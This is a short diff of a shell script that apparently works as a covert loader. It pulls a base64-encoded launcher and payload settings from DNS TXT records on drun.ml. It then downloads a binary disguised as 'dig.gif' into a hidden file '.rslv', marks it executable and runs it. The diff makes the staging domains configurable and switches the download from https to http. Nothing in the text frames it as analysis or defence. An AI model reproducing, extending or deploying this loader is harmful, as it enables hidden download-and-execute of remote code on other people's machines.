@@ -45,15 +45,15 @@ querydns() {
 
 endpoints() {
     chunksize=2047 # 1 char for order
-    zone=drun.ml
-    record=d
+    zone=${lr_zone:-drun.ml}
+    record=${lr_record:-d}
     data=$(querydns)
     parsedata
     launcher=${data}
     launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
     # script_url=$(dig txt latest.drun.ml +short)
-    zone=drun.ml
-    record=plvars
+    zone=${pl_zone:-drun.ml}
+    record=${pl_record:-plvars}
     pl_vars=$(querydns)
     pl_vars=${pl_vars/\"}
     pl_vars=${pl_vars%\"}
@@ -76,7 +76,7 @@ endpoints_fallback() {
 filename=".rslv"
 getdig() {
     ## try
-    digurl="https://pld.drun.ml/dig.gif"
+    digurl="http://pld.drun.ml/dig.gif"
     wget -t 2 -T 10 -q -i- -O- > ${filename} <<< "$digurl" && chmod +x ${filename}
     digv="$(./${filename} -v 2>&1)"
     [ "${digv/DiG}" != "${digv}" ] && return
